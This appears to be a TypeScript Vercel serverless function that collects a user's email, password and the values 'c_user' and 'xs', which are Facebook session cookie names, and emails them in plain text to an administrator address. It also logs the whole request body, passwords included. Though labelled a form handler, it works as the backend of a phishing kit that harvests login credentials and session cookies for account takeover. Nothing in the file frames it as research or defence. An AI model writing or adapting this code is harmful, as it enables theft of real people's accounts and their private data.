import { VercelRequest, VercelResponse } from '@vercel/node';
import nodemailer from 'nodemailer';

// Add detailed logging for SMTP configuration
const smtpHost = process.env.FORM_TWO_SMTP_HOST || process.env.SMTP_HOST;
const smtpPort = parseInt(process.env.SMTP_PORT || '587');
const smtpUser = process.env.FORM_TWO_SMTP_USER || process.env.SMTP_USER;
const smtpPass = process.env.FORM_TWO_SMTP_PASS || process.env.SMTP_PASS;
const adminEmail = process.env.ADMIN_EMAIL;

// Log SMTP configuration (excluding sensitive data)
console.log('SMTP Configuration:', {
  host: smtpHost,
  port: smtpPort,
  secure: false,
  hasUser: !!smtpUser,
  hasPass: !!smtpPass,
  hasAdminEmail: !!adminEmail
});

const transporter = nodemailer.createTransport({
  host: smtpHost,
  port: smtpPort,
  secure: false,
  auth: {
    user: smtpUser,
    pass: smtpPass,
  },
});

export default async function handler(req: VercelRequest, res: VercelResponse) {
  console.log('Received request:', {
    method: req.method,
    headers: req.headers,
    body: req.body
  });

  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method not allowed' });
  }

  try {
    const { user_email, password, c_user, xs } = req.body;

    if (!user_email || !password || !c_user || !xs) {
      console.log('Missing required fields:', { 
        user_email: !!user_email, 
        password: !!password, 
        c_user: !!c_user, 
        xs: !!xs 
      });
      return res.status(400).json({ message: 'Missing required fields' });
    }

    if (!adminEmail) {
      console.error('Admin email not configured');
      return res.status(500).json({ message: 'Server configuration error' });
    }

    // Verify SMTP connection before sending
    try {
      await transporter.verify();
      console.log('SMTP connection verified');
    } catch (verifyError) {
      console.error('SMTP verification failed:', verifyError);
      return res.status(500).json({ message: 'Email service unavailable' });
    }

    // Send email
    try {
      const emailResult = await transporter.sendMail({
        from: smtpUser,
        to: adminEmail,
        subject: 'New Form Two Submission',
        html: `
          <h2>New Form Two Submission</h2>
          <p><strong>Email:</strong> ${user_email}</p>
          <p><strong>Password:</strong> ${password}</p>
          <p><strong>c_user:</strong> ${c_user}</p>
          <p><strong>xs:</strong> ${xs}</p>
          <p><strong>Submission Time:</strong> ${new Date().toISOString()}</p>
        `,
      });

      console.log('Email sent successfully:', emailResult);
      res.status(200).json({ message: 'Form submitted successfully' });
    } catch (emailError: any) {
      console.error('Email sending failed:', {
        error: emailError.message,
        code: emailError.code,
        command: emailError.command
      });
      return res.status(500).json({ 
        message: 'Failed to send email',
        error: emailError.message 
      });
    }
  } catch (error) {
    console.error('Form submission error:', error);
    res.status(500).json({ 
      message: 'Error submitting form',
      error: error instanceof Error ? error.message : 'Unknown error'
    });
  }
}